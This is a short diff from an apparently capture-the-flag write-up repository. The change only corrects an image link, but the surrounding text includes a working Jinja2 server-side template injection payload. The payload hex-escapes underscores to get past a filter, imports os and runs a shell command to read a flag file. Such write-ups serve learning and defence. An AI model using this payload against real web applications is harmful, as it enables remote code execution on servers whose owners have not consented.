@@ -75,4 +75,4 @@ So in the end, our ultimate goal is to be able to execute code on the machine. F
 
 ``{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('grep FDCA flag*')|attr('read')()}}``
 
-![](https://github.com/Soyakongen/ctf-writeups/blob/main/ctf-writeups/writeupfiles/image4_redacted.png)
+![](https://github.com/Soyakongen/ctf-writeups/blob/main/writeupfiles/image4_redacted.png)
